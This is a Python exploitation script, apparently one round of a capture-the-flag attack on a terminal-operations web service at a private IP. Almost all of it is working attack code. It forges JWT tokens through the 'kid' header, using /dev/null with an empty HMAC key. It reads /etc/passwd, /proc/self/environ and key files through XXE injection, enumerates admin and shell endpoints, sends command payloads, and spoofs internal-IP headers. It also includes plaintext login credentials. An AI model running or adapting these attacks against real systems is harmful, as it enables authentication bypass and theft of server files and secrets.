#!/usr/bin/env python3
"""round69 — /services endpoint, /app/keys/probe via kid oracle, /etc/hosts retry,
concurrent XXE+probe, portal with auth"""
import requests, json, time, hashlib, hmac as hm, base64, threading, sys

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}
AUTH_CR = {"Authorization": f"Bearer {jwt_forged('carrier')}"}
AUTH_ADMIN = {"Authorization": f"Bearer {jwt_forged('admin')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

def extract_xxe(path, field="remarks", timeout=10):
    code, text = xxe_read(path, field, timeout)
    if code == 200:
        try:
            data = json.loads(text)
            val = data.get("ticket", {}).get(field, "")
            return code, val
        except:
            return code, text
    return code, text

# ============================================================
print("="*70)
print("PHASE 0: CHECK SERVER HEALTH")
print("="*70)

for attempt in range(3):
    try:
        r = S.get(f"{CASPI}/healthz", timeout=5)
        print(f"  Attempt {attempt+1}: [{r.status_code}] {r.text[:100]}")
        if r.status_code == 200:
            print("  Server is healthy!")
            break
    except Exception as e:
        print(f"  Attempt {attempt+1}: {e}")
    time.sleep(2)

# Quick XXE test to confirm it still works
code, val = extract_xxe("/app/requirements.txt")
print(f"  XXE test (requirements.txt): [{code}] {val[:100] if val else 'empty'}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: EXPLORE /services ENDPOINT")
print("="*70)
print("  Discovered in navigation: ['/', '/services', '/login', '/register']")

# GET /services without auth
try:
    r = S.get(f"{CASPI}/services", timeout=10, allow_redirects=False)
    print(f"\n  [{r.status_code}] GET /services (no auth):")
    if 'Location' in r.headers:
        print(f"    Redirect: {r.headers['Location']}")
    text = r.text
    print(f"    Body ({len(text)} bytes):")
    # Print full page but limit to 3000 chars
    print(text[:3000])
    if len(text) > 3000:
        print(f"\n    ... ({len(text)-3000} more bytes)")
    # Extract links
    import re
    scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', text)
    links = re.findall(r'href=["\']([^"\']+)["\']', text)
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', text)
    apis = re.findall(r'/api/[a-zA-Z0-9/_-]+', text)
    if scripts: print(f"\n    Scripts: {scripts}")
    if forms: print(f"    Forms: {forms}")
    if apis: print(f"    API refs: {apis}")
    # Look for interesting keywords
    for keyword in ['probe', 'secret', 'flag', 'key', 'hmac', 'sign',
                    'gauge', 'llehs', 'shell', 'admin', 'config']:
        if keyword.lower() in text.lower():
            print(f"    *** KEYWORD '{keyword}' found in page! ***")
except Exception as e:
    print(f"  Error: {e}")

# GET /services with auth
for role_name, headers in [("operator", AUTH_OP), ("carrier", AUTH_CR), ("admin", AUTH_ADMIN)]:
    try:
        r = S.get(f"{CASPI}/services", headers=headers, timeout=10, allow_redirects=False)
        if r.status_code != 404:
            text = r.text
            # Check if different from unauthenticated
            print(f"\n  [{r.status_code}] GET /services as {role_name}:")
            if 'probe' in text.lower() or 'admin' in text.lower():
                print(f"    *** Different content with auth! ***")
                print(text[:2000])
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PORTAL WITH AUTH")
print("="*70)

for path in ["/portal", "/portal/", "/dashboard", "/admin", "/admin/"]:
    for role_name, headers in [("operator", AUTH_OP), ("carrier", AUTH_CR), ("admin", AUTH_ADMIN)]:
        try:
            r = S.get(f"{CASPI}{path}", headers=headers, timeout=5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 303]:
                print(f"\n  [{r.status_code}] GET {path} as {role_name}:")
                if 'Location' in r.headers:
                    print(f"    Redirect: {r.headers['Location']}")
                if r.status_code == 200:
                    text = r.text[:2000]
                    print(f"    Body ({len(r.text)} bytes):")
                    print(text[:1500])
                    import re
                    apis = re.findall(r'/api/[a-zA-Z0-9/_-]+', text)
                    if apis: print(f"\n    API refs: {apis}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: /api/auth/me — FULL RESPONSE INSPECTION")
print("="*70)

# Forged JWT — what fields come back?
for role in ["operator", "carrier", "admin", "probe", "root", "superadmin"]:
    token = jwt_forged(role=role)
    try:
        r = S.get(f"{CASPI}/api/auth/me",
                 headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  role={role}: [{r.status_code}] {r.text[:300]}")
    except:
        pass

# Real account
try:
    r = S.post(f"{CASPI}/api/auth/login",
              json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
              timeout=5)
    print(f"\n  Real login: [{r.status_code}] {r.text[:500]}")
    if r.status_code == 200:
        data = r.json()
        real_token = data.get("token", "")
        if real_token:
            r2 = S.get(f"{CASPI}/api/auth/me",
                      headers={"Authorization": f"Bearer {real_token}"}, timeout=5)
            print(f"  Real /me: [{r2.status_code}] {r2.text[:500]}")

            # Try all endpoints with real token
            for path in ["/portal", "/api/ops/probe/sign?device=lm-01",
                        "/api/ops/custody", "/api/ops",
                        "/api/admin", "/api/config", "/api/secret",
                        "/api/probe", "/api/env",
                        "/api/internal", "/services"]:
                try:
                    r3 = S.get(f"{CASPI}{path}",
                              headers={"Authorization": f"Bearer {real_token}"}, timeout=5)
                    if r3.status_code not in [401, 403, 404, 405]:
                        print(f"  Real token {path}: [{r3.status_code}] {r3.text[:300]}")
                except:
                    pass
except Exception as e:
    print(f"  Login error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: KID ORACLE — /app/keys/probe AS KID")
print("="*70)
print("  If /app/keys/probe is a regular file (not FIFO),")
print("  kid oracle should read it and use as HMAC key.")
print("  Testing with SHORT timeout to detect blocking reads.")

# Known probe data
PROBE_URL = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
PROBE_SIG = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Test: does kid="/app/keys/probe" timeout (like XXE did)?
# If yes → file blocks on read (FIFO/pipe)
# If no (403) → file is normal but wrong key
# If 200 → found the key!

# First, try with empty key to see if it returns quickly
print("  Testing kid=/app/keys/probe with empty key...")
t0 = time.time()
try:
    token = jwt_forged(role="operator", kid="/app/keys/probe", key=b'')
    r = S.get(f"{CASPI}/api/auth/me",
             headers={"Authorization": f"Bearer {token}"}, timeout=5)
    elapsed = time.time() - t0
    print(f"    [{r.status_code}] in {elapsed:.1f}s: {r.text[:200]}")
    if elapsed > 4:
        print("    *** SLOW RESPONSE — possible blocking read! ***")
    elif r.status_code == 403:
        print("    File read OK but wrong key — it's a regular file!")
    elif r.status_code == 200:
        print("    *** PROBE_SECRET IS EMPTY?? ***")
except requests.exceptions.Timeout:
    elapsed = time.time() - t0
    print(f"    TIMEOUT after {elapsed:.1f}s — FILE BLOCKS ON READ (FIFO/pipe)!")
except Exception as e:
    print(f"    Error: {e}")

# Also test with carrier and operator keys (which we know work)
print("\n  Testing kid=/app/keys/carrier (known to work)...")
t0 = time.time()
try:
    token = jwt_forged(role="operator", kid="/app/keys/carrier", key=b'')
    r = S.get(f"{CASPI}/api/auth/me",
             headers={"Authorization": f"Bearer {token}"}, timeout=5)
    elapsed = time.time() - t0
    print(f"    [{r.status_code}] in {elapsed:.1f}s (baseline)")
except Exception as e:
    print(f"    {e}")

# Try kid=probe (relative — maybe the code prepends /app/keys/)
print("\n  Testing kid='probe' (relative path)...")
t0 = time.time()
try:
    token = jwt_forged(role="operator", kid="probe", key=b'')
    r = S.get(f"{CASPI}/api/auth/me",
             headers={"Authorization": f"Bearer {token}"}, timeout=5)
    elapsed = time.time() - t0
    print(f"    [{r.status_code}] in {elapsed:.1f}s: {r.text[:200]}")
except requests.exceptions.Timeout:
    print(f"    TIMEOUT — kid='probe' file read blocks!")
except Exception as e:
    print(f"    {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: RETRY READABLE FILES (after server recovery)")
print("="*70)

files_to_read = [
    "/etc/hosts",
    "/etc/passwd",
    "/etc/resolv.conf",
    "/etc/environment",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/status",
    "/proc/version",
    "/proc/self/net/route",
    "/proc/self/net/unix",
    "/root/.bashrc",
]

for path in files_to_read:
    code, val = extract_xxe(path, timeout=8)
    if code == 200 and val and len(val) > 0:
        lines = val.split('\n')
        print(f"\n  {path} ({len(val)} bytes, {len(lines)} lines):")
        for line in lines[:20]:
            print(f"    {line}")
        if len(lines) > 20:
            print(f"    ... ({len(lines)-20} more lines)")
        # Look for interesting info
        if 'gauge' in val.lower() or 'probe' in val.lower() or '172.18.0.4' in val:
            print(f"    *** INTERESTING CONTENT! ***")
    elif code == 400:
        print(f"  EXISTS (special chars): {path}")
    elif code == -1:
        print(f"  TIMEOUT: {path}")
    elif code != 200:
        print(f"  [{code}] {path}: {val[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: API ENDPOINT DISCOVERY — SYSTEMATIC")
print("="*70)

# Try all reasonable /api/* paths
api_paths = [
    "/api/ops",
    "/api/ops/",
    "/api/ops/probe",
    "/api/ops/probe/",
    "/api/ops/probe/sign",
    "/api/ops/probe/verify",
    "/api/ops/probe/list",
    "/api/ops/probe/devices",
    "/api/ops/probe/config",
    "/api/ops/probe/secret",
    "/api/ops/probe/key",
    "/api/ops/custody",
    "/api/ops/custody/",
    "/api/ops/custody/list",
    "/api/ops/custody/tickets",
    "/api/ops/custody/transfer",
    "/api/ops/gauge",
    "/api/ops/tank",
    "/api/ops/tanks",
    "/api/ops/meter",
    "/api/ops/meters",
    "/api/ops/flow",
    "/api/ops/level",
    "/api/ops/config",
    "/api/ops/secret",
    "/api/ops/shell",
    "/api/ops/llehs",
    "/api/ops/exec",
    "/api/ops/run",
    "/api/ops/command",
    "/api/auth",
    "/api/auth/",
    "/api/auth/me",
    "/api/auth/login",
    "/api/auth/register",
    "/api/auth/logout",
    "/api/auth/token",
    "/api/auth/refresh",
    "/api/auth/keys",
    "/api/auth/config",
    "/api/admin",
    "/api/admin/",
    "/api/admin/config",
    "/api/admin/users",
    "/api/admin/secret",
    "/api/admin/probe",
    "/api/config",
    "/api/config/",
    "/api/env",
    "/api/secret",
    "/api/flag",
    "/api/status",
    "/api/health",
    "/api/version",
    "/api/docs",
    "/api/swagger",
    "/api/internal",
    "/api/shell",
    "/api/llehs",
    "/api/exec",
    "/api/v1",
    "/api/v2",
    "/api/debug",
]

found_apis = []
for path in api_paths:
    for role_name, headers in [("none", {}), ("operator", AUTH_OP), ("admin", AUTH_ADMIN)]:
        try:
            r = S.get(f"{CASPI}{path}", headers=headers, timeout=3)
            if r.status_code not in [404, 405]:
                result = f"  [{r.status_code}] {role_name:>8} GET {path}: {r.text[:200]}"
                if result not in [f.get('result') for f in found_apis]:
                    found_apis.append({"path": path, "role": role_name,
                                      "code": r.status_code, "result": result})
                    print(result)
        except:
            pass

# POST on interesting endpoints
for path in ["/api/ops", "/api/ops/probe", "/api/ops/custody",
             "/api/admin", "/api/config", "/api/shell", "/api/llehs",
             "/api/ops/shell", "/api/ops/llehs", "/api/ops/exec"]:
    for ct, data in [("application/json", '{"cmd":"id"}'),
                     ("application/json", '{}'),
                     ("text/plain", "id")]:
        try:
            r = S.post(f"{CASPI}{path}", data=data,
                      headers={**AUTH_OP, "Content-Type": ct}, timeout=3)
            if r.status_code not in [404, 405]:
                print(f"  [{r.status_code}] POST {path} ({ct}): {r.text[:200]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: XXE — /app/keys/probe WITH SHORT TIMEOUT")
print("="*70)
print("  Previously timed out at 10s. Testing with 3s timeout.")
print("  If it returns quickly → previous timeout was server overload.")
print("  If it times out again → file is a blocking read (FIFO/pipe).")

time.sleep(3)  # Let server recover

t0 = time.time()
code, text = xxe_read("/app/keys/probe", timeout=3)
elapsed = time.time() - t0
print(f"  /app/keys/probe: [{code}] in {elapsed:.1f}s: {text[:200]}")

# Wait and retry
time.sleep(2)

t0 = time.time()
code, text = xxe_read("/app/keys/probe", timeout=3)
elapsed = time.time() - t0
print(f"  /app/keys/probe (retry): [{code}] in {elapsed:.1f}s: {text[:200]}")

# Try reading the keys we KNOW work, to confirm server is alive
time.sleep(2)
code, val = extract_xxe("/app/requirements.txt", timeout=5)
print(f"  Server check (requirements.txt): [{code}]")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: CONCURRENT XXE + PROBE REQUEST")
print("="*70)
print("  If /app/keys/probe is a FIFO, maybe the probe endpoint writes to it.")
print("  Sending XXE read AND probe request simultaneously.")

results = {"xxe": None, "probe": None}

def xxe_thread():
    """Read /app/keys/probe via XXE — will block if FIFO"""
    try:
        xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/keys/probe">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml,
            headers={**{"Authorization": f"Bearer {jwt_forged('operator')}"},
                     "Content-Type": "application/xml"},
            timeout=15)
        results["xxe"] = (r.status_code, r.text[:500])
    except Exception as e:
        results["xxe"] = (-1, str(e))

def probe_thread():
    """Trigger probe — might write to the FIFO"""
    time.sleep(0.5)  # Start slightly after XXE
    try:
        probe_data = {
            "url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
            "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
        }
        r = requests.post(f"{CASPI}/api/ops/probe", json=probe_data,
            headers={"Authorization": f"Bearer {jwt_forged('operator')}"},
            timeout=10)
        results["probe"] = (r.status_code, r.text[:500])
    except Exception as e:
        results["probe"] = (-1, str(e))

t0 = time.time()
t1 = threading.Thread(target=xxe_thread)
t2 = threading.Thread(target=probe_thread)
t1.start()
t2.start()
t1.join(timeout=20)
t2.join(timeout=15)
elapsed = time.time() - t0

print(f"  Elapsed: {elapsed:.1f}s")
print(f"  XXE result: {results['xxe']}")
print(f"  Probe result: {results['probe']}")

# Try multiple probe triggers while XXE is reading
time.sleep(3)  # Let server recover
print("\n  Attempting with MULTIPLE probe triggers...")

results2 = {"xxe": None, "probes": []}

def xxe_thread2():
    try:
        xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/keys/probe">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml,
            headers={**{"Authorization": f"Bearer {jwt_forged('operator')}"},
                     "Content-Type": "application/xml"},
            timeout=15)
        results2["xxe"] = (r.status_code, r.text[:500])
    except Exception as e:
        results2["xxe"] = (-1, str(e))

def multi_probe():
    """Send multiple probe requests with delays"""
    for i in range(5):
        time.sleep(0.3 + i*0.5)
        try:
            # Use different devices
            devices = ["lm-01", "tk-01", "tk-02", "tk-03", "tk-07"]
            device = devices[i % len(devices)]
            # Get signed URL
            r = requests.get(f"{CASPI}/api/ops/probe/sign",
                params={"device": device},
                headers={"Authorization": f"Bearer {jwt_forged('operator')}"},
                timeout=5)
            if r.status_code == 200:
                data = r.json()
                # Trigger probe
                r2 = requests.post(f"{CASPI}/api/ops/probe", json=data,
                    headers={"Authorization": f"Bearer {jwt_forged('operator')}"},
                    timeout=5)
                results2["probes"].append((device, r2.status_code, r2.text[:100]))
        except Exception as e:
            results2["probes"].append((f"error-{i}", -1, str(e)))

t0 = time.time()
t1 = threading.Thread(target=xxe_thread2)
t2 = threading.Thread(target=multi_probe)
t1.start()
t2.start()
t1.join(timeout=25)
t2.join(timeout=20)
elapsed = time.time() - t0

print(f"  Elapsed: {elapsed:.1f}s")
print(f"  XXE result: {results2['xxe']}")
for p in results2["probes"]:
    print(f"  Probe {p[0]}: [{p[1]}] {p[2]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: ADDITIONAL CREATIVE APPROACHES")
print("="*70)

# 1. Try X-Forwarded-For / X-Real-IP to access internal endpoints
print("  Testing internal access headers...")
for path in ["/api/ops/probe/secret", "/api/admin", "/api/config",
             "/api/internal", "/api/ops/probe/key"]:
    for ip in ["127.0.0.1", "172.18.0.5", "172.18.0.7", "172.18.0.4"]:
        try:
            r = S.get(f"{CASPI}{path}",
                     headers={**AUTH_OP,
                             "X-Forwarded-For": ip,
                             "X-Real-IP": ip},
                     timeout=3)
            if r.status_code not in [404, 405, 403]:
                print(f"  [{r.status_code}] {path} (XFF={ip}): {r.text[:200]}")
        except:
            pass

# 2. Try JWT with various kid paths that might reveal key content in errors
print("\n  Testing JWT kid error messages...")
for kid in ["/app/keys/probe", "probe", "keys/probe",
            "../keys/probe", "/app/keys/../keys/probe",
            "/dev/null", "/dev/zero",
            "/app/keys/carrier", "/app/keys/operator",
            "/proc/self/environ", "/etc/hostname"]:
    try:
        token = jwt_forged(role="operator", kid=kid, key=b'')
        r = S.get(f"{CASPI}/api/auth/me",
                 headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  kid={kid}: [{r.status_code}] {r.text[:200]}")
    except requests.exceptions.Timeout:
        print(f"  kid={kid}: TIMEOUT (blocking read!)")
    except Exception as e:
        print(f"  kid={kid}: {e}")

# 3. Try to read /app/keys/ directory listing (XXE on dirs)
print("\n  Trying XXE on directory paths...")
for path in ["/app/keys", "/app/keys/", "/app/static", "/app/templates",
             "/app", "/app/"]:
    code, val = extract_xxe(path, timeout=5)
    if code == 200 and val:
        print(f"  {path}: [{code}] {val[:300]}")
    elif code != 200:
        print(f"  {path}: [{code}] {val[:100] if val else ''}")

print("\n"+"="*70)
print("DONE")
print("="*70)
